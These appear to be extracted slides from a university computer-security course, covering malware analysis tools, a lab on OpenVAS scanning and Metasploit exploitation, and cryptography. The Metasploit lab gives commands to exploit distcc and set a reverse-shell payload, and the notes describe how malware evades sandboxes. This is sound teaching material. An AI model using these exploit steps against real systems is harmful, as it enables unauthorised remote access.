Locate ‘Anti-disassembly’ techniques.
Locate the payload.


Some more advanced static analysis techniques use machine learning algorithms to locate malicious files.
24

25
IDA
IDA is a Windows, Linux or Mac OS X hosted multi-processor disassembler and debugger.






The community version offers good enough functionality, though the PRO version offers much more.
25

26
Dynamic Analysis
BASIC
26

27
Basic Dynamic Analysis
The use of tools for extracting certain information of a running program:
I/O operations
Used files
Used system-calls
Network requests
Open threads / processes
Resource usage
Registry changes
Etc.

27

28
Procmon
The simplest tool
Saves each action in the OS system. 
Shows real-time file system, Registry and process/thread activity.
Enables to see the stack of every process
In 10 seconds provides 95K logs. 
28

29
Procmon
Due to the huge number of logs, we cannot work with this software manually.
It requires knowledge regarding applying filters and advanced search.
Experts can watch over specific file that runs. 
Helps to show what was changed.
It is recommended to watch on suspicious file using two configurations: one that is legitimate and one with the given malware. 
The environment before each running MUST be clean. 
29

30
Procmon
30

31

כאן אנו צופים בעצם את ה-stack של כל process. 
לכל Process יש את ה-stack שלו. 
שימו לב לפי ה-Address הכל עם 7 פתאום יש לנו 1. לא קשור. 
גם הלוקיישן שמציג שם הפונקציה והנתיב.
30
Procmon
An advanced monitoring tool for Windows that shows real-time file system, Registry and process/thread activity.
31

32
Process Explorer
Shows information about which handles and DLLs processes have opened or loaded.
32

33


32
Process Explorer

33

34

כאן ניתן לראות שדוחפים לו מידע ולא ידוע מאיפה. 

33
Regshot
A registry compares utility that allows you to quickly take a snapshot of your registry and then compare it with a second one - done after doing system changes or installing a new software product (e.g. malware).
34

35


34
Regshot
Drawbacks:
Hard to choose the right snapshots
Depends on the tester’s intuition. 
35

36

הבעיה: תלוי אינטואציה של הטסטר.
35
Sandboxes - Cuckoo
Cuckoo Sandbox is an advanced, extremely modular malware analysis system which can:
Analyze many different malicious files (executables, document exploits, Java applets) as well as malicious websites, in Windows, OS X, Linux, and Android virtualized environments.
Trace API calls and general behavior of the file.
Dump and analyze network traffic, even when encrypted.
Perform advanced memory analysis of the infected virtualized system with integrated support for Volatility.
Outputs a report for the scanned file.
36

37

זה מריץ בסביבה וירטואלית. 
זה בעצם חוקר שנכתב בקוד. 
הבעיה: זה מריץ את המלוור על זמן שאול. 
מלוור שמריץ פיבונאצ'י כדי להעביר את הזמן יתחמק מ-couckoo (time to live) 
הקוקובוקס הפך למוצר הדגל של החוקרים.
הוא גם חכם – מוריד sleeps של מלוורים. 
הרבה מלוורים בודקים כמה ליבות יש כדי לא לרוץ אם אין יש רק ליבה אחת – סביבה וירטואלית. 
הקוקובוקס כבר נבנה כך שתהיינה לו מספר ליבות כדי להפיל את המלוורים האלה.  
מה זה Volatility?
לחקור את הזכרון 
זה בעצם עושה 
Dump
ל-RAM.
Volatility זו גם תוכנה. 
יש מלוור בשם פאוורליקס שהוא חסר קבצים. 
לא ניתן להשתמש ב-regshot. 
מה שיעזור פה זה הזכרון. 
מה גודלו? כגודל של ה-Ram.
עושה snapshot לזכרון

36
Sandboxes - Cuckoo
Drawbacks:
Has time to run – if the malware takes time to attack Cuckoo will not identify it.  For example, malware that computes Fibonacci.
Now it is the product that most of the experts work with.
Includes many extensions for Android, and other that other expert added. 

37

38

זה בעצם חוקר שנכתב בקוד. 
37
Dynamic Analysis
ADVANCED
38

39
Advanced Dynamic Analysis
Using various techniques to debug a program
Working step by step to investigate the program’s behavior.





Some more advanced dynamic analysis techniques may use machine learning algorithms used on the dynamic information of the program.
39

40

כאן בעצם נכנס ה-Reverse Engineering. זה בעצם אומר תהליך של גילוי עקרונות טכנולוגים והנדסיים של מוצר דרך ניתוח המבנה שלו ואופן פעולתו. בתחום הסייבר זה מסייע לאיתור באגים ופרצות אבטחה ביישומי המחשב השונים.

מתי נצטרך את ה-Advanced? תשובה: כאשר נצטרך לעשות unpack ונרצה להשוות.
למה IDA לא יעזור פה? כי הוא כבר packed. נרצה לפתוח אותו ולראות שלב שלב מה קורה.
39
GDB
the GNU Project debugger, allows you to see what is going on ‘inside’ another program while it executes, or what another program was doing at the moment it crashed:
Start your program, specifying anything that might affect its behavior.
Make your program stop on specified conditions.
Examine what has happened, when your program has stopped.
Change things in your program, so you can experiment with correcting the effects of one bug and go on to learn about another.
40

41

הדיבגר של לינוקס
40
Summary
Introduction to Malware Analysis
Static Analysis
Basic Static Analysis
Advanced Static Analysis
Dynamic Analysis
Basic Dynamic Analysis
Advanced Dynamic Analysis

41

42
 
</TEXT>
</DOC>
<DOC>
<DOCNO> C:\Dan\UNI\Jarta.Projects\Hackathon\searchEngine\corpus\MoodleFiles\אבטחת-מחשבים-ורשתות-תקשורת-סמ-2\תרגולים\תרגול-11---Open-VAS---Metasploit\PS-12---OpenVas--MF_New.pptx </DOCNO>
<F P=104> אבטחת-מחשבים-ורשתות-תקשורת-סמ-2 </F>
<TEXT>
Computer & Information Security
1
PRACTICAL SESSION NO. 11
OPENVAS & METASPLOIT

2
Environment Setup
Before we can start performing this lab you should run the KALI virtual machine (under D:\Virtual Machines)
Username: root
Password: toor



2

3
OpenVAS – Getting Stated
To start OpenVAS necessary services you should execute the openvas-start command as follows

Please validate that OpenVAS manager, scanner, and GSAD services are listening, by running netstat
In order to start using OpenVAS you should first create a user
To do so, type the following command








3
root@kali:~# openvas-start
root@kali:~# openvasmd --create-user <user-name>

4
OpenVAS – Getting Stated
To use OpenVAS necessary services you should execute the openvas installation command as follows:
Choose Terminal
Do you want to continue? y
Afterwards:
Downloading the vulnerabilities by year and install.








4
root@kali:~# apt-get install openvas
root@kali:~# openvas-setup

5
Introduction
 In the last decade, the number of cyber attacks increases gradually. 


5

6
Introduction
These attacks can cause:
Losses of intellectual assets
Confidential business information sensitive business data, which can include stock market manipulation
Damage to reputation
Cybercrimes that may end up costing hundreds of millions of dollar every year


6

7
Introduction
Therefore, organizations which care about their assets and reputation wish to preempt a cure to such attacks.
As a result, they hire penetration testers that their goal is to penetrate into the organization and collect important assets. 


7

8
Introduction
Other options:
Analyze vulnerabilities in case of working with new servers. 
Attempt to reach to DOS or to change something that will cause troubles.



8

9

למשל: להעלות פוסט מתוך הבית הלבן שהנשיא מת. 
8
Penetration Testing
There are three types of penetration testing:
Black to Red
Red to Red no user
Red to Red with user


9

10
Use Case


10

11
Use Case


11

12
Use Case


12
DMZ


Server

WAN
LAN

13
DMZ
Demilitarized Zone


13

14
DMZ
Demilitarized Zone


14

15
DMZ
Demilitarized Zone


15

16
Black to Red


16
DMZ


Server

WAN
LAN
Target Alice
Eve

17
Red to Red (no user)


17
LAN
Target Alice
Eve

18

במקרה כאן, נניח החברה מפחדת מ-Visitors שנכנסים אליה. אין להם יוזר, והחברה רוצה לראות אילו בעיות הם יכולים לעשות לה. 
17
Red to Red (with user)


18
LAN
Target Alice
Eve

19

כאן זה עם יוזר בתוך הארגון. כאן החברה רוצה לראות מה עובד מתוך הארגון יכול לעולל לה. 
18
OpenVAS – Overview
Vulnerability scanning is a crucial phase of a penetration testing
Having an updated vulnerability scanner can often make a real difference by helping you discover vulnerable items
The open vulnerability assessment system (a.k.a. OpenVAS) is a framework offering a comprehensive and powerful vulnerability scanning and vulnerability management solutions
The security scanner is regularly updated with new network vulnerabilities
OpenVAS is a free software

19

20
Environment Setup
Before we can start performing this lab you should run the KALI virtual machine (under D:\Virtual Machines)
Username: root
Password: toor



20

21
OpenVAS – Getting Stated
To start OpenVAS necessary services you should execute the openvas-start command as follows

Please validate that OpenVAS manager, scanner, and GSAD services are listening, by running netstat
In order to start using OpenVAS you should first create a user
To do so, type the following command








21
root@kali:~# openvas-start
root@kali:~# openvasmd --create-user <user-name>

22
OpenVAS – Getting Stated
To use OpenVAS necessary services you should execute the openvas installation command as follows:
Choose Terminal
Do you want to continue? y
Afterwards:
Downloading the vulnerabilities by year and install.








22
root@kali:~# apt-get install openvas
root@kali:~# openvas-setup

23
OpenVAS – Getting Stated
When it finished you should see in the terminal:








23

24
OpenVAS – Getting Stated
The Mozilla browser will open automatically.









24

25
OpenVAS – Getting Stated
The Mozilla browser will open automatically.









25

26
OpenVAS – Getting Stated
Click on “Add Exception” button.
Click on “Confirm Security Exception”
The result:










26

27
OpenVAS – Getting Stated
Username: admin
Password: copy from the terminal 










27

28
OpenVAS – Getting Stated










28

29
After doing so, point your browser to https://127.0.0.1:9392
Enter the credentials for the user you created
29


30
OpenVAS – Getting Stated
To start OpenVAS necessary services you should execute the openvas-start command as follows

Please validate that OpenVAS manager, scanner, and GSAD services are listening, by running netstat
In order to start using OpenVAS you should first create a user
To do so, type the following command








30
root@kali:~# openvas-start
root@kali:~# openvasmd --create-user <user-name>

31
OpenVAS – Quick Start
You can immediately scan a target  IP by entering its IP address into the quick start text-box
This short-cut will do the following:
Create a new Target with default Port List
Create a new Task using this target with default Scan Configuration
Start this scan task right away
Switch the view to reload every 30 seconds so you can lean back and watch the scan progress

31


32
OpenVAS – Quick Start
Before start scanning the entire network, figure out what is the IP of the Multipliable VM using nmap 
Note that the target machine should be reachable to the Kali VM (you should put them on the same virtual network)
Q1 – Which of the ports of the target machine are open

32


33
You can click the status-bar for revealing the scan details
33

34
List of vulnerabilities found on the vulnerable machine
34


35
DISTCC vulnerability details 
35

36
User - 

CVE – דרך רשמית לכתוב חולשות.
35
How can we exploit the DISTCC vulnerability?

36

37
Black to Red


37
DMZ


Server

WAN
LAN
Target Alice
Eve

38
Metasploit Usage
Metasploit is used for two things:
Initial Access - Penetration
Weaponization – of the attacker.
The metasploit provides a payload usually when we succeeded to infiltrate.  
In most of the cases, with high privileges.
These privileges will assist to move the weapons to the attacked user. 












38

39

החדירה למחשב או לאיזור הרצוי. 
2. חימוש של התוקף. – זה בעצם אומר שאני מעביר מלוור או נניח כלי שיתקוף רק את המחשב של אליס. זה כבר APT. 

38
What is a payload?












39

40

החדירה למחשב או לאיזור הרצוי. 
2. חימוש של התוקף. – זה בעצם אומר שאני מעביר מלוור או נניח כלי שיתקוף רק את המחשב של אליס. זה כבר APT. 
כאן נכנס העניין של Zero day. נסחר בטירוף. 

39
Weaponization
Other option is using of RAT (Remote Administrator Tool)
It take full control on a computer. 
Even, if a user restarts the computer, the shell still will work.
The RAT also can move between the computers. 












40

41


40
Black to Red


41
DMZ


Server

WAN
LAN
Target Alice
Eve


42
Metasploit Framework – Overview
An open source project that provides a public resource for researching security vulnerabilities
A framework that allows a network administrator to break into his own network to identify security risks
A framework that allows pen-testers to execute exploits
42

43
Metasploit Framework – Getting Started
Metasploit uses PostgreSQL as its database so it needs to be launched
To start the Kali PostgreSQL service type the following command

You can verify that PostgreSQL is running by checking that port 5432 is listening using netstat
With PostgreSQL up and running, we next need to initialize the Metasploit Framework PostgreSQL database using the init command

43
root@kali:~# service postgresql start
root@kali:~# msfdb init

44
Metasploit Framework – Getting Started
Now that the PostgreSQL service is up and running and the database is initialized, you can launch msfconsole and verify database connectivity with the db_status command as shown below.


The following command will show the exploits exists in the DB

44
root@kali:~# msfconsole
msf > db_status

msf > show exploits

45
Metasploit Framework – Basic commands
You can also search for an exploit using the search command

To select an exploit you can use the use command


45
msf > search <key-word>
msf > use exploit/unix/misc/distcc_exec

46
Metasploit Framework – Selecting a payload
After selecting the exploit we need to set an appropriate payload (the code that runs after we exploits the vulnerability)
In most of the cases the payload is uses for opening a shell to the target machine
For listing the compatible payloads to the selected exploit we use the show payloads command


46
msf > show payloads

47
List of payloads for the DISTCC exploit

47

48
Metasploit Framework –payload types
As you may notice there are two common types of shells
Bind shell - a bind shell opens up a new service on the target machine, and requires the attacker to connect to it in order to get a session
Reverse shell - a reverse shell (a.k.a. connect-back) is the exact opposite, it requires the attacker to set up a listener first, the target machine acts as a client connecting to that listener
Q2 - When we should consider using a reverse shell?



48

49

תשובה: כשאנחנו ב-Black to red. 
 אם המחשב מאחורי NAT או בסביבה נפרדת נצטרך reverse shell 
אם המחשב באותה הרשת ולא מוסתר אחד מהשני אפשר להשתמש ב bind shell
48
Metasploit Framework – Configuring the Payload
We can set the payload using the set payload command

Additionally, we need to configure the target and host parameters:
RHOST – the target IP
RPORT – the Port of the vulnerable application in the target machine
LHOST – the IP for the connection back address in reverse payloads (Your IP)
LPORT – your listener port (generally 4444)





49
msf > set payload /cmd/unix/reverse
msf > set LHOST 10.0.0.8
lhost => 10.0.0.8

50
Metasploit Framework – Running the exploit
To run the exploit we use the run/exploit command
Successful run of an exploit will open a cmd shell








50

51
Armitage Framework – Configuring the Payload
51

52

זה Metasploit ב-GUI. 
51
 
</TEXT>
</DOC>
<DOC>
<DOCNO> C:\Dan\UNI\Jarta.Projects\Hackathon\searchEngine\corpus\MoodleFiles\אבטחת-מחשבים-ורשתות-תקשורת-סמ-2\תרגולים\תרגול-2---הצפנה-במפתח-סימטרי\PS-2.pptx </DOCNO>
<F P=104> אבטחת-מחשבים-ורשתות-תקשורת-סמ-2 </F>
<TEXT>
PRACTICAL SESSION NO. 2
CRYPTOGRAPHY – PART A

Computer & Information Security
Cryptography
 Definition :
Latin: kryptós= hidden,  graphein = writing
The practice and study of techniques for secure communication


Julius Caesar
Ancient Greek Scytale
Enigma machine
Goals of Cryptography
 Confidentiality
Make sure that information cannot be accessed by unauthorized individuals, entities or process
Key exchange – Agree on secret key for encryption
Encryption – make the data readable only to trusted entities 
 Integrity 
 Validate that the message was not changed or replaced (Signature, Message Authentication Code)
Authentication
Source Authentication – validate the identity of the other side (signature, certificate)
Something you know: password, PIN code, your elementary school name etc,
Something you have : driver license, token, card etc. 
Something you are : Biometrics, fingerprints, retina (eye) etc.



3
Encryption
Symmetric Encryption
Public Key Encryption



4
Symmetric Encryption – Feistel Network
 Basis for symmetric block encryption algorithms like DES/3 DES  
 have a general iterative block cipher structure
sequence of rounds
substitutions/permutations controlled by key
 Main parameters and design features:
Block size, key size, number of rounds
Sub-key generation algorithm
 Sub-keys are generated using the (master) key and generation algorithm
 Plaintext is divided into two halves: L0 and R0
 F is a function that combines between Ri and Ki
Preforms substitution and permutation (or "confusion and diffusion“)
 N-rounds for encryption/decryption of a block 


Feistel Network – סכמה להצפנה סימטרית של בלוקים (אינה אלגוריתם בפני עצמו). אלגוריתמים כמו DES  ,3DES ומשתמשים בה.
תחילה הטקסט מחולק ל 2
תהליך הצפנה איטרטיבי
מהמפתח המקורי מייצרים תת מפתח שונה לכל שלב בעזרת אלגוריתם יצרת תת מפתחות
בכל שלב החלק הימני מהשלב הקודם הופך לחלק השמאלי
החלק השמאלי מהשלב הקודם עובר פונקציית הצפנה עם תת המפתח ו XOR עם החלק הימני הקודם. התוצאה עוברת לחלק הימני בשלב הבא
פונקציית ההצפנה מבצעת XOR עם תת-המפתח בשלב זה ולאחר מכן מסדרת את המידע מחדש כך שבכל פעם המידע "יזוז" ויתערבב עם חלקים אחרים




5
Cryptography
Data Encryption Standard (DES)
Symmetric Encryption Systems


Data Encryption Standard (DES)
 Based on Feistel Network
 Minor variation of the Feistel network
 Block size = 64 bit
 Master Key size = 64 bit 
Uses only 56 bit
Another 8 bit from the 64bit saved for error detection in key generation 
 16 rounds -> 16 sub-Keys Ki (48 bit each) are generated
 Can be cracked by brute force attack within few days using a PC
 Solution?

Encryption
Decryption

לוקחים מפתח של 64 ביטים, בפועל משתמשים רק ב56 ביטים על מנת לחולל 16 מפתחות בגודל של 48 ביטים כ"א
7
3-DES (ECB Mode)
Enc (DES)
PT
KEY 1
Cipher A
Dec (DES)
KEY 2
Cipher B
Enc (DES)
KEY 3
Cipher
64bit
64bit
Dec (DES)
PT
KEY 3
Cipher B
Enc (DES)
KEY 2
Cipher A
Dec (DES)
KEY 1
64bit
64bit
Cipher


Encryption
Decription

יותר חזק אך משלמים בביצועים
8
What about 2-DES?
 2-DES – good or a bad idea? Think!
 Does brute force attack yields the best result?



 Known Plaintext Attack 
 The attacker knows both the Plaintext and
Cipher. Thus, can reveal the encryption key


2-DES : Meet in the middle attack 
 Solution:
Given a two pairs of Plain-text and Cypher-text <P1,C1>,<P2,C2>
Encrypt P1 with DES using all possible keys
Decrypt C1 with DES using all possible keys
Compare the encryption outputs with the decryption outputs
Every matching  will reveal a possible K1,K2 pair
Test all possible key-pairs on <P2,C2> to reveal the correct key-pair
 Time complexity:
Encrypt with all possible keys (in DES = O()) 
Decrypt with all possible keys (in DES = O())
Compare results – O(1) using look up table
 Memory: look up table requires O() memory


הבהרה: 
גודל הmaster key הוא 64 ביט, אך בפועל במהלך אלגוריתם יצירת המפתחות (לכל האיטרציות) לא משתמשים בביטים שהם כפולות של 8 (הביט ה8,16,24..64(,
ולכן התקפת Brute Force תעבור רק על הביטים הרלוונטיים שהם סה"כ 56 ביטים.
10
DES - Question
Think…
4. 	1. 
5. 	2. 
6. 	3. 
DES - Solution



Equations:	




לסמן נקודות על הלוח שיהיה נוח לסטודנטים להבין
12
4. 	1. 
5. 	2. 
6. 	3. 
DES – Solution (cont.)


  9) 

11)  5 ,1 :  =
12) 








DES- Solution (cont.)
 9) 
12) 


Hence,



We can decrypt any cryptograms in O(1) complexity 





14
Cryptography
Advanced Encryption Standard (AES)
Symmetric Encryption Systems
Advanced Encryption Standard (AES)

 More secure and faster than 3DES
 key length can be 128 /192/ 256 bits
 Not a Feistel network but also an iterative algorithm
 A data block is represented as 4X4 Bytes matrix (128 bit) called State
 Applies 10 rounds:
In each* step preform:
Substitute bytes (SubBytes)
Shift rows
Mix columns
Add round key (the only stage that uses the key)


הרעיון מזכיר רשת פייסטל אבל זה לא מבוסס על הסכמה שלו.
כיום האלגוריתם נפוץ עם מפתחות בגודל של 128 ביטים
האלגוריתם איטרטיבי ומפעיל תת-מפתח בכל שלב.
גם האלגוריתם הזה מסדר את המידע בכל שלב כדי שהרבה ביטים "יגעו" אחד בשני.

האלגוריתם בנוי מארבע תתי שלבים שמופעלים (כמעט) בכל שלב:
בשלב הראשון מבצעים רק את פעולה add round key
בשלב האחרון לא מבצעים את הפעולה mix columns
16
AES – Pseudo Code

האלגוריתם בנוי מארבע תתי שלבים שמופעלים (כמעט) בכל שלב:
בשלב הראשון מבצעים רק את פעולה add round key
בשלב האחרון לא מבצעים את הפעולה mix columns

17
AES – Substitute bytes
 Done with a simple lookup (inversable) table called S-Box
a 1616 matrix of byte values
maps each byte to a new value
e.g. {95} maps to {2A}
Adds non-linearity to the encryption
 Constructed using finite field properties
designed to be resistant to known cryptanalytic attacks
 Decrypt uses inverse of S-Box


18
S-Box 




Shift Rows
 On encryption: shift each row of State by 0,1,2,3 bytes respectively 
    (first row remains original)
 Ensures that each column is now spread over 4 columns
 Decrypt does reverse


שורה ראשונה מבצעת הזזה ציקלית שמאלה של 0 בתים, שורה שניה של 1 בתים, שורה שלישית של 2 בתים ושורה רביעית של 3 בתים. 
להראות הסבר על העובדה שלאחר הSHIFT ROWS כל עמודה "נפרסת" על 4 עמודות – יש חשיבות גבוהה לפיצול ל4 עמודות בשביל חוזק ההצפנה

20
Mix Column
 Operates on each column individually
 Each column C is multiplied by a constant matrix M
Cnew = M * C
Every new value is a function of all four bytes in the column



Note that in a finite field the arithmetic operations (addition and multiplication) are different from non finite fields   


כדאי להזכיר איך עובד כפל מטריצות

כיוון שהמטריצות קבועות ומספר הערכים האפשריים בעמודות קטן אפשר לבנות טבלה של תוצאות כפל במקום לכפול כל פעם

פעולת ה SHIFT-ROWS ו MIX-Columns דואג שלאחר מספר סיבובים הפלט יהיה תלוי בכל הביטים

=> כלומר הודעה עם ביט אחד שונה תשפיע על ההצפנה של כל הביטים – מקשה מאוד על פיצוח הצופן

21
Add Round Key
 XOR State with bits of expanded key





 The round key expansion and other stages of AES make the algorithm secure


בשלב הזה פשוט עושים XOR עם המפתח באותו שלב.

מה שמבטיח שהאלגוריתם יהיה "בטוח" הם השלבים האחרים שמבצעים והדרך בה יוצרים את תתי המפתחות

22
Expanded Key -176 byte Key

Word0
Word1
Word2
Word3

Original Key
16 byte Key (4 Words)
			
			
			
			
			
			
			

Word0
Word1
Word2
Word3

……
….
…..
……

Word4  =  F(word3,word,0)
Word5  =  F(word4,word,1)
Word6  =  F(word5,word,2)
Word7  =  F(word6,word,3)

			
			
			
			


Original
 Key


Sub-k10

Sub-k9
Sub-k2
Sub-k0
…
11 sub – keys (16 bytes)

Word40
Word41
Word42
Word43
AES - Key-Expansion and Creation of Round-Key


23
AES – Animation example

https://www.youtube.com/watch?v=mlzxpkdXP58

Why Shift-Rows & Mix-Columns Are Important?
 The mix column transformation combined with the shift row transformation ensures that after a few rounds, all output bits depend on all input bits
 Do these actions help against brute-force attack?
No!
However, Brute-force on the key is impossible ( possibilities)
 So what are they good for?
Improve encryption (cypher  plain text)
Harder to perform known plain/cypher text attacks
Guessing part of the key will not be helpful

Why Shift-Rows & Mix-Columns Are Important?
Consider K1 and K2:


 Lets encrypt an image using AES with K1 and K2


K1
K2


26
Why Shift-Rows & Mix-Columns Are Important?
What would happened if we decrypted with the opposed key? 













K1
K2


K2
K1

The Keys have just 1 different bit!!
Why Shift-Rows & Mix-Columns Are Important?
What would happened if we didn’t mixed columns?

K2


K2
K1
K1


28
Why Shift-Rows & Mix-Columns Are Important?
What would happened if we didn’t shift rows?

K1
K2


K2
K1


29
Why Shift-Rows & Mix-Columns Are Important?
SUMMARY
 Its quite noticeable that Mix Columns and Shift-Rows are important for the encryption
 Applying this steps will generate totally different results even when the key is almost the same (1 bit is different)

NO SHIFT-ROWS AND NO MIX-COLUMNS
K1
K2


K2
K1
 
</TEXT>
</DOC>
<DOC>
<DOCNO> C:\Dan\UNI\Jarta.Projects\Hackathon\searchEngine\corpus\MoodleFiles\אבטחת-מחשבים-ורשתות-תקשורת-סמ-2\תרגולים\תרגול-3---הצפנה-במפתח-סימטרי---MAC\PS-3-new.pptx </DOCNO>
<F P=104> אבטחת-מחשבים-ורשתות-תקשורת-סמ-2 </F>
<TEXT>
PRACTICAL SESSION NO. 3
CRYPTOGRAPHY – PART B

Computer & Information Security
Encryption
Symmetric Encryption
Public Key Encryption



2
Recall: AES – Pseudo Code

האלגוריתם בנוי מארבע תתי שלבים שמופעלים (כמעט) בכל שלב:
בשלב הראשון מבצעים רק את פעולה add round key
בשלב האחרון לא מבצעים את הפעולה mix columns

3
Question 1
Bob’s and Alice share a secret key K (256 bit). 
Alice sends Bob a message using the following algorithm:
1) String FinalCypher = “”
2) For index = 0 to length(message):
2.1) Char c = Message[i]
2.2) Int tmp = convert c to an integer according to lexicographical order 
2.3) String cyp = AES(tmp,K)
2.4) FinalCypher.append(cyp)
3) Alice sends Bob Final-Cypher



4
Question 1 - cont
Question 1A: Is the suggested protocol is secured against brute force for finding the correct key?
1) String FinalCypher = “”
2) For index = 0 to length(message):
2.1) Char c = Message[i]
2.2) Int tmp = convert c to an integer according to lexicographical order 
2.3) String cyp = AES(tmp,K)
2.4) FinalCypher.append(cyp)
3) Alice sends Bob Final-Cypher



5
Question 1 - cont
Question 1A: Is the suggested protocol is secured against brute force for finding the correct key?

Yes. 
In this question the symmetric key is 256 bit long 
So applying a brute-force attack requires the attacker to decrypt the message with every possible key  possible keys).
 ~ (about 9.63× years for the fastest computer today).


6
Question 1 - cont
Question 1B: Is this protocol is secured?

1) String FinalCypher = “”
2) For index = 0 to length(message):
2.1) Char c = Message[i]
2.2) Int tmp = convert c to an integer according to lexicographical order 
2.3) String cyp = AES(tmp,K)
2.4) FinalCypher.append(cyp)
3) Alice sends Bob Final-Cypher



7
Question 1 - cont
Question 1B: Is this protocol is secured?

What is the size of the domain of all possible cyphers?
Size of English alphabet = |{A,B,C……..,Z}| = 26

How can attackers decrypt each of the 26 characters?
The attacker can create a histogram that counts each of the cyphers that have been seen in several messages. The size of the histogram is 26.
The attacker can infer the character that belongs to each of the cyphers by comparing the distribution of the histogram with the known distribution for English alphabet.


8
Question 1 - cont
Question 1C: How can mitigate such an attack?



9
Question 1 - cont
Question 1C: How can mitigate such an attack?

By encrypting a few characters together (e.g., 256 bit) instead of encrypting each character by its own.



10
Question 2
Prove that Simple AES is vulnerable to a known plaintext attack.

Known Plaintext Attack 
The attacker knows both the Plaintext and
Cipher. 

Question 2 - Solution
C = Simple_AES(M,K1) = 
AddRoundKey(MixColumns(ShiftRows(SubBytes(M))),K1)
Question 2 - Solution
C = Simple_AES(M,K1) = 
AddRoundKey(MixColumns(ShiftRows(SubBytes(M))),K1)

Lets define S as:
S = MixColumns(ShiftRows(SubBytes(M)))
=>
 C  = AddRoundKey(S,K1)
Question 2 - Solution
S = MixColumns(ShiftRows(SubBytes(M)))

The attacker can calculate S because:
The method SubBytes - is known to anyone
The method ShiftRows - is known to anyone
The method MixColumns – is known to anyone
M – is known to the attacker
Question 2 - Solution
The attacker can calculate S because:
 C  = AddRoundKey(S,K1) = SꚚK1
=>
K1 = SꚚC
We calculated S and C is known.
Cryptography 
Message Authentication Codes (MAC)
Integrity
Message Authentication Codes (MAC)
MAC is a short piece of information used to authenticate a message - in other words, to confirm that the message came from the stated sender (its authenticity) and has not been changed.
Message Authentication Codes (MAC)
MAC is a short piece of information used to authenticate a message - in other words, to confirm that the message came from the stated sender (its authenticity) and has not been changed.

Used for:
Integrity – assuring that the message was not changed.
Authentication – authenticating the sender.
Message Authentication Codes (MAC)
There are many implementation of MAC algorithms
The following MAC algorithm is based on a symmetric key K.
Sender
Calculates MAC for a message using a symmetric MAC algorithm.
Sends the MAC and the message together.

Receiver
Calculates MAC for the received message using a symmetric MAC algorithm.
Compares the output to the received output.

MAC is required to be smaller than the original data

CBC-MAC Algorithm Scheme
 Message = m1 m2  …  mx
 Symetric key K and symetric encription algortim E



להראות דוג' על הלוח
20
Attacks on CBC-MAC
 Concatenation attack
Eve choses m1, m2 randomly
Eve asks for m1 encryption - 
Eve calculates and asks encryption of 
,k) = 
Now ) is a valid CBC-MAC of 





Question 3 
A new system was installed on the front gate to a secret organization. When a worker wish to enter the organization and open the front gate he/she uses a dedicated application that runs the following code:





K1 is a symmetric key that is shared by the entire users of the application.
Server on the Internet
Open-Door-1(){
String command = “Open”
String cypher = AES(command,K1)
Send-command-to-server(cypher1)
}
Question 3 
Question 3A: What is the problem with the suggested algorithm?

Question 3 
Question 3A: What is the problem with the suggested algorithm?

The cryptogram that is sent to the server remains the same so attacker can apply a replay attack:
Attacker intercepts a message that is sent to the cloud
Attacker retransmit the message
The gate is opened
Question 3 
Question 3B: In order to mitigate a replay attack, the developers included a message authentication code in the protocol. Is the system secured from replay attacks?

Open-Door-2(){
String command = “Open”
String cypher1 = AES-ENCRYPT(command,K1)
String cypher2 = MAC(command,K2)
Send-to-server(cypher1,cypher2)
}
Question 3 
Question 3B: In order to mitigate a replay attack, the developers included a message authentication code in the protocol. Is the system secured from replay attacks?

No. If the attacker managed to intercept the cypher1 and cypher2 he\she can open the gate and send retransmit them and open the gate.

Open-Door-2(){
String command = “Open”
String cypher1 = AES-ENCRYPT(command,K1)
String cypher2 = MAC(command,K2)
Send-to-server(cypher1,cypher2)
}
Question 3 
Question 3C: How can we secure the system?


Question 3 
Question 3C: How can we secure the system?
By using a ticket: adding the time that the command was sent and limiting validity of the command to a reasonable window of time.

Gate
Decrypt the command and the timestamp using AES.
If more than 1 minute was not passed from the sent timestamp, than open the gate.
Sender
Open-Door-2(){
String timestamp = currentTime ()
String command = “Open” 
String cypher1 = AES(command,K1)
String cypher2 = AES(timestamp,K2)
Send-to-server(cypher1,cypher2)
}

 
</TEXT>
</DOC>
<DOC>
<DOCNO> C:\Dan\UNI\Jarta.Projects\Hackathon\searchEngine\corpus\MoodleFiles\אבטחת-מחשבים-ורשתות-תקשורת-סמ-2\תרגולים\תרגול-4---הצפנה-במפתח-פומבי\PS-4.pptx </DOCNO>
<F P=104> אבטחת-מחשבים-ורשתות-תקשורת-סמ-2 </F>
<TEXT>
PRACTICAL SESSION NO. 4
CRYPTOGRAPHY – PART C

Computer & Information Security
Encryption
Symmetric Encryption
Public Key Encryption



2
Public Key Encryption


Primary Motivation: It is very difficult for two parties to share a symmetric key. 

How can they distribute it to each other?




3
Cryptography
RSA Algorithm (Rivest, Shamir & Adelman)
Public Key Cryptography
RSA Algorithm
 Key Generation
Randomly choose two distinct prime numbers  and  
Compute 
Compute the Euler's function -  
 where 
If  -> example: n=5 {1,2,3,4}-> size=4=5-1
 -> example: p=2 q=3 {1,2,3,4,5} -> size =  2 = (2-1)*(3-1)=1*2 =2
Choose an integer 
Public-Key = 
Determine an integer that 
Private-key = 
 Encryption

 Decryption



פי של אן היא בעצם פונקציה שאומרת כמה מספרים קטנים מאן יש שאין להם מחלק משותף עם אן
D הוא ההופכי של e בשדה סופי

5
RSA- Example
Key Generation


Need to chose  where, 
let 
Public-Key: (7, 55)
Let’s compute  : 
 
Private-Key: (23,55)
Encryption 
Message = 2
Cypher = Messagee mod n

Decryption
Message = Cypherd mod n






6
Possible attacks on RSA
In order to break RSA, we need to calculate , such that:

Note that is public, thus we need to find:

so we need to find  such that 
integer factorization (Prime factorization) is Not an easy task
For year 2009 it takes approximately two years to factorize a 768 bit number

בעיית הפירוק לגורמים היא בעיה קשה
אם נצליח לפרק נמצא את d (המפתח הפרטי ופרצנו את המערכת)
7
Possible attacks on RSA – chosen Cyphertext attack
 Notice the following attributes of RSA (Multiplicative)
  * 
 
 Given a cypher  that we want to decrypt, we lot  and  calculate 
 Than we can ask to decrypt   and and get and 
  is the decryption


Cryptographic hash function are used in order to mitigates this attack!


8
Hybrid Protocol
 RSA is much slower than symmetric algorithms
 The hybrid algorithm take the advantages of symmetric and asymmetric key
Algorithm:
Generate a symmetric key 
The sender encrypt  with the public key  of the receiver
 
The receiver decrypts  using his private key 

Both the receiver and the sender have the same symmetric key 
The communication are encrypted using symmetric algorithm such as AES or DES
Hybrid Protocol
Considering the suggested protocol:
Algorithm:
Generate a symmetric key 
The sender encrypt  with the public key  of the receiver
 
The receiver decrypts  using his private key 

Both the receiver and the sender have the same symmetric key 
